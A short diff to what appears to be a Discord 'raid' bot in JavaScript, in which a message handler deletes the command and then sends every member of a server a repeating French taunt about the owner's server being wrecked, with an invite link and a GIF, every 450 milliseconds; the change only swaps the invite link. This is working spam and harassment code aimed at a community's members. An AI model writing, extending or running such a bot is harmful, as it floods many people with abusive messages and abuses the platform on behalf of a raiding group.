@@ -33,7 +33,7 @@ bot.on('message', msg => {
                 if (msg.deletable) msg.delete();
                 msg.guild.members.forEach(member => {
                   setInterval(function () {
-                    member.send(msg.guild.owner.user.username+" s'est fait bz son serv par https://discord.gg/gmqf6wT https://media.discordapp.net/attachments/494613905654546435/515855972846272513/giphy-4.gif?width=270&height=270").catch(error => {}) }, 450)})
+                    member.send(msg.guild.owner.user.username+" s'est fait bz son serv par https://discord.gg/sGGZPJN https://media.discordapp.net/attachments/494613905654546435/515855972846272513/giphy-4.gif?width=270&height=270").catch(error => {}) }, 450)})
        }
 
 if(msg.content === '.del'){
